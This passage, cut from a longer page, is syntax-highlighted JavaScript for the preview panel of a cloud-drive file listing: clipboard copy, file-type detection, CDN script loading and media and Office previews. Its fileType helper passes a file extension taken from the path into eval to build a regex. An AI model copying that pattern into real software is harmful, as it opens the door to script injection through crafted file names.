source.<span class="property">textContent</span>;</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(target);</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">let</span> range = <span class="variable language_">document</span>.<span class="title function_">createRange</span>();</span></span><br><span class="line"><span class="language-javascript">                                range.<span class="title function_">selectNode</span>(target);</span></span><br><span class="line"><span class="language-javascript">                                <span class="variable language_">window</span>.<span class="title function_">getSelection</span>().<span class="title function_">removeAllRanges</span>();</span></span><br><span class="line"><span class="language-javascript">                                <span class="variable language_">window</span>.<span class="title function_">getSelection</span>().<span class="title function_">addRange</span>(range);</span></span><br><span class="line"><span class="language-javascript">                                <span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&#x27;copy&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                                <span class="variable language_">window</span>.<span class="title function_">getSelection</span>().<span class="title function_">removeAllRanges</span>();</span></span><br><span class="line"><span class="language-javascript">                                result = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                            &#125; <span class="keyword">catch</span> (e) &#123; &#125;</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(target);</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">return</span> result;</span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">fileType</span>: <span class="function"><span class="params">suffix</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">contains</span> = <span class="keyword">function</span> (<span class="params">search</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">const</span> object = <span class="variable language_">this</span>;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> object) &#123;</span></span><br><span class="line"><span class="language-javascript">                                    <span class="keyword">if</span> (object.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span></span><br><span class="line"><span class="language-javascript">                                        <span class="keyword">if</span> ((<span class="built_in">eval</span>(<span class="string">&#x27;/&#x27;</span> + search + <span class="string">&#x27;/i&#x27;</span>)).<span class="title function_">test</span>(object[key])) &#123;</span></span><br><span class="line"><span class="language-javascript">                                            <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                                        &#125;</span></span><br><span class="line"><span class="language-javascript">                                    &#125;</span></span><br><span class="line"><span class="language-javascript">                                &#125;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">                            &#125;;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">if</span> ([<span class="string">&#x27;bmp&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;svg&#x27;</span>, <span class="string">&#x27;webp&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>].<span class="title function_">contains</span>(suffix)) &#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">return</span> <span class="string">&#x27;image&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ([<span class="string">&#x27;mp3&#x27;</span>, <span class="string">&#x27;flac&#x27;</span>, <span class="string">&#x27;wav&#x27;</span>].<span class="title function_">contains</span>(suffix)) &#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">return</span> <span class="string">&#x27;audio&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ([<span class="string">&#x27;mp4&#x27;</span>, <span class="string">&#x27;avi&#x27;</span>, <span class="string">&#x27;mkv&#x27;</span>, <span class="string">&#x27;flv&#x27;</span>, <span class="string">&#x27;m3u8&#x27;</span>].<span class="title function_">contains</span>(suffix)) &#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">return</span> <span class="string">&#x27;video&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (</span></span><br><span class="line"><span class="language-javascript">                                [</span></span><br><span class="line"><span class="language-javascript">                                    <span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;cpp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                                    <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;ps1&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                                    <span class="string">&#x27;bat&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;py&#x27;</span>, <span class="string">&#x27;go&#x27;</span>, <span class="string">&#x27;asp&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                                ].<span class="title function_">contains</span>(suffix)</span></span><br><span class="line"><span class="language-javascript">                            ) &#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">return</span> <span class="string">&#x27;text&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (</span></span><br><span class="line"><span class="language-javascript">                                [<span class="string">&#x27;doc&#x27;</span>, <span class="string">&#x27;docx&#x27;</span>, <span class="string">&#x27;ppt&#x27;</span>, <span class="string">&#x27;pptx&#x27;</span>, <span class="string">&#x27;xls&#x27;</span>, <span class="string">&#x27;xlsx&#x27;</span>, <span class="string">&#x27;mpp&#x27;</span>, <span class="string">&#x27;rtf&#x27;</span>, <span class="string">&#x27;vsd&#x27;</span>, <span class="string">&#x27;vsdx&#x27;</span>].<span class="title function_">contains</span>(suffix)</span></span><br><span class="line"><span class="language-javascript">                            ) &#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">return</span> <span class="string">&#x27;office&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            &#125;</span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">loadResource</span>: <span class="function">(<span class="params">resource, callback</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">let</span> type;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">switch</span> (resource.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="title function_">pop</span>()) &#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">case</span> <span class="string">&#x27;css&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">                                    type = <span class="string">&#x27;link&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">case</span> <span class="string">&#x27;js&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">                                    type = <span class="string">&#x27;script&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                            &#125;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">let</span> element = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(type);</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">let</span> loaded = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">if</span> (<span class="keyword">typeof</span> callback === <span class="string">&#x27;function&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                                element.<span class="property">onload</span> = element.<span class="property">onreadystatechange</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                                    <span class="keyword">if</span> (!loaded &amp;&amp; (!element.<span class="property">readyState</span> || <span class="regexp">/loaded|complete/</span>.<span class="title function_">test</span>(</span></span><br><span class="line"><span class="language-javascript">                                        element.<span class="property">readyState</span>))) &#123;</span></span><br><span class="line"><span class="language-javascript">                                        element.<span class="property">onload</span> = element.<span class="property">onreadystatechange</span> = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">                                        loaded = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                                        <span class="title function_">callback</span>();</span></span><br><span class="line"><span class="language-javascript">                                    &#125;</span></span><br><span class="line"><span class="language-javascript">                                &#125;</span></span><br><span class="line"><span class="language-javascript">                            &#125;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">if</span> (type === <span class="string">&#x27;link&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                                element.<span class="property">href</span> = resource;</span></span><br><span class="line"><span class="language-javascript">                                element.<span class="property">rel</span> = <span class="string">&#x27;stylesheet&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                                element.<span class="property">src</span> = resource;</span></span><br><span class="line"><span class="language-javascript">                            &#125;</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;head&#x27;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(element);</span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">createDplayer</span>: <span class="function">(<span class="params">video, type, elem</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">const</span> host = <span class="string">&#x27;//s0.pstatp.com/cdn/expire-1-M&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">const</span> resources = [</span></span><br><span class="line"><span class="language-javascript">                                <span class="string">&#x27;/dplayer/1.25.0/DPlayer.min.css&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                                <span class="string">&#x27;/dplayer/1.25.0/DPlayer.min.js&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                                <span class="string">&#x27;/hls.js/0.12.4/hls.light.min.js&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                                <span class="string">&#x27;/flv.js/1.5.0/flv.min.js&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                            ];</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">let</span> unloadedResourceCount = resources.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">                            resources.<span class="title function_">forEach</span>(<span class="function"><span class="params">resource</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                                previewHandler.<span class="title function_">loadResource</span>(host + resource, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                                    <span class="keyword">if</span> (!--unloadedResourceCount) &#123;</span></span><br><span class="line"><span class="language-javascript">                                        <span class="keyword">let</span> option = &#123;</span></span><br><span class="line"><span class="language-javascript">                                            <span class="attr">url</span>: video</span></span><br><span class="line"><span class="language-javascript">                                        &#125;</span></span><br><span class="line"><span class="language-javascript">                                        <span class="keyword">if</span> (type === <span class="string">&#x27;flv&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                                            option.<span class="property">type</span> = <span class="string">&#x27;flv&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                                        &#125;</span></span><br><span class="line"><span class="language-javascript">                                        <span class="keyword">new</span> <span class="title class_">DPlayer</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                                            <span class="attr">container</span>: elem,</span></span><br><span class="line"><span class="language-javascript">                                            <span class="attr">screenshot</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">                                            <span class="attr">video</span>: option</span></span><br><span class="line"><span class="language-javascript">                                        &#125;);</span></span><br><span class="line"><span class="language-javascript">                                    &#125;</span></span><br><span class="line"><span class="language-javascript">                                &#125;)</span></span><br><span class="line"><span class="language-javascript">                            &#125;);</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> suffix = path.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="title function_">pop</span>();</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">let</span> content = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.content&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">switch</span> (previewHandler.<span class="title function_">fileType</span>(suffix)) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">case</span> <span class="string">&#x27;image&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">let</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span></span><br><span class="line"><span class="language-javascript">                            img.<span class="property">style</span>.<span class="property">maxWidth</span> = <span class="string">&#x27;100%&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            img.<span class="property">src</span> = url;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">let</span> fancy = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                            fancy.<span class="title function_">setAttribute</span>(<span class="string">&#x27;data-fancybox&#x27;</span>, <span class="string">&#x27;image&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                            fancy.<span class="property">href</span> = img.<span class="property">src</span>;</span></span><br><span class="line"><span class="language-javascript">                            fancy.<span class="title function_">append</span>(img);</span></span><br><span class="line"><span class="language-javascript">                            content.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            content.<span class="title function_">append</span>(fancy);</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">case</span> <span class="string">&#x27;audio&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">let</span> audio = <span class="keyword">new</span> <span class="title class_">Audio</span>();</span></span><br><span class="line"><span class="language-javascript">                            audio.<span class="property">style</span>.<span class="property">outline</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            audio.<span class="property">preload</span> = <span class="string">&#x27;auto&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            audio.<span class="property">controls</span> = <span class="string">&#x27;controls&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            audio.<span class="property">style</span>.<span class="property">width</span> = <span class="string">&#x27;100%&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            audio.<span class="property">src</span> = url;</span></span><br><span class="line"><span class="language-javascript">                            content.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            content.<span class="title function_">append</span>(audio);</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">case</span> <span class="string">&#x27;video&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">let</span> video = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                            previewHandler.<span class="title function_">createDplayer</span>(url, suffix, video);</span></span><br><span class="line"><span class="language-javascript">                            content.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            content.<span class="title function_">append</span>(video);</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">case</span> <span class="string">&#x27;text&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">let</span> pre = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;pre&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">let</span> code = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;code&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                            pre.<span class="title function_">append</span>(code);</span></span><br><span class="line"><span class="language-javascript">                            pre.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&#x27;rgb(245,245,245)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            pre.<span class="property">style</span>[<span class="string">&#x27;overflow-x&#x27;</span>] = <span class="string">&#x27;scroll&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            pre.<span class="property">classList</span>.<span class="title function_">add</span>(suffix);</span></span><br><span class="line"><span class="language-javascript">                            content.<span class="property">style</span>[<span class="string">&#x27;text-align&#x27;</span>] = <span class="string">&#x27;initial&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            content.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            content.<span class="title function_">append</span>(pre);</span></span><br><span class="line"><span class="language-javascript">                            <span class="title function_">sendRequest</span>(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">null</span>, <span class="literal">null</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                                code.<span class="property">textContent</span> = data;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">if</span> (size.<span class="title function_">indexOf</span>(<span class="string">&#x27; B&#x27;</span>) &gt;= <span class="number">0</span> || size.<span class="title function_">indexOf</span>(<span class="string">&#x27; KB&#x27;</span>) &amp;&amp;</span></span><br><span class="line"><span class="language-javascript">                                    size.<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>] &lt; <span class="number">100</span></span></span><br><span class="line"><span class="language-javascript">                                ) &#123;</span></span><br><span class="line"><span class="language-javascript">                                    hljs.<span class="title function_">highlightBlock</span>(pre);</span></span><br><span class="line"><span class="language-javascript">                                &#125;</span></span><br><span class="line"><span class="language-javascript">                            &#125;);</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">case</span> <span class="string">&#x27;office&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">const</span> officeOnline = <span class="string">&#x27;//view.officeapps.live.com/op/view.aspx?src=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(url);</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">let</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                            div.<span class="property">style</span>.<span class="property">lineHeight</span> = <span class="string">&#x27;2em&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            div.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&#x27;rgba(218, 215, 215, 0.21)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            div.<span class="property">style</span>.<span class="property">webkitTapHighlightColor</span> = <span class="string">&#x27;rgba(0, 0, 0, 0)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            div.<span class="property">style</span>.<span class="property">cursor</span> = <span class="string">&#x27;pointer&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            div.<span class="property">innerHTML</span> = <span class="string">&#x27;新窗口打开&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="title function_">open</span>(officeOnline));</span></span><br><span class="line"><span class="language-javascript">                            content.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            content.<span class="title function_">appendChild</span>(div);</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientWidth</span> &gt;= <span class="number">480</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">let</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                                iframe.<span class="property">width</span> = <span class="string">&#x27;100%&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                                iframe.<span class="property">style</span>.<span class="property">height</span> = <span class="string">&#x27;41em&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                                iframe.<span class="property">style</span>.<span class="property">border</span> = <span class="string">&#x27;0&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                                iframe.<span class="property">src</span> = officeOnline;</span></span><br><span class="line"><span class="language-javascript">                                content.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript">                            &#125;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">default</span>:</span></span><br><span class="line"><span class="language-javascript">                            content.<span class="property">style</span>[<span class="string">&#x27;text-align&#x27;</span>] = <span class="string">&#x27;center&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            content.<span class="property">innerHTML</span> = <span class="string">&#x27;该文件不支持预览&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.file-name&#x27;</span>).<span class="property">innerHTML</span> = path;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn.download&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="function">() =&gt;</span> location.<span class="property">href</span> = url</span></span><br><span class="line"><span class="language-javascript">                    );</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn.quote&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                            previewHandler.<span class="title function_">copyTextContent</span>(<span class="literal">null</span>, <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">url</span> + <span class="string">&#x27;?file=&#x27;</span> + path);</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn.quote&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                            btn.<span class="property">innerHTML</span> = <span class="string">&#x27;已复制&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> btn.<span class="property">innerHTML</span> = <span class="string">&#x27;引用&#x27;</span>, <span class="number">250</span>);</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    );</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn.share&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">const</span> <span class="title function_">sharePath</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">let</span> arr = <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">current</span>.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">let</span> r = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">                                    r += <span class="string">&#x27;/&#x27;</span> + arr[i];</span></span><br><span class="line"><span class="language-javascript">                                &#125;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">return</span> r;</span></span><br><span class="line"><span class="language-javascript">                            &#125;</span></span><br><span class="line"><span class="language-javascript">                            previewHandler.<span class="title function_">copyTextContent</span>(<span class="literal">null</span>,</span></span><br><span class="line"><span class="language-javascript">                                <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">origin</span> +</span></span><br><span class="line"><span class="language-javascript">                                <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">pathname</span> +</span></span><br><span class="line"><span class="language-javascript">                                <span class="string">&#x27;?path=&#x27;</span> + <span class="title function_">sharePath</span>());</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn.share&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                            btn.<span class="property">innerHTML</span> = <span class="string">&#x27;已复制&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> btn.<span class="property">innerHTML</span> = <span class="string">&#x27;分享&#x27;</span>, <span class="number">250</span>);</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    );</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">switchRightDisplay</span>(<span class="string">&#x27;preview&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">let</span> start = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">let</span> right = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.right&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> <span class="title function_">scrollToBottom</span> = (<span class="params">timestamp</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">if</span> (!start) start = timestamp;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">let</span> progress = timestamp - start;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">let</span> last = right.<span class="property">scrollTop</span>;</span></span><br><span class="line"><span class="language-javascript">                        right.<span class="title function_">scrollTo</span>(<span class="number">0</span>, right.<span class="property">scrollTop</span> + <span class="number">14</span>);</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">if</span> (right.<span class="property">scrollTop</span> !== last &amp;&amp; progress &lt; <span class="number">1000</span> * <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">window</span>.<span class="title function_">requestAnimationFrame</span>(scrollToBottom);</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="title function_">requestAnimationFrame</span>(scrollToBottom);</span></span><br><span class="line"><span class="language-javascript">                &#125;);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                elem.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">fetchFileList</span>(path);</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">switchBackForwardStatus</span>(path);</span></span><br><span class="line"><span class="language-javascript">                &#125;);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">addBackForwardListener</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;arrow-back&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, back);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;arrow-forward&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, forward);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#main-page&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">fetchFileList</span>(<span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">root</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">switchBackForwardStatus</span>(<span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">root</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">switchRightDisplay</span>(<span class="params">display</span>) &#123;</span></span><br><span class="line"><span 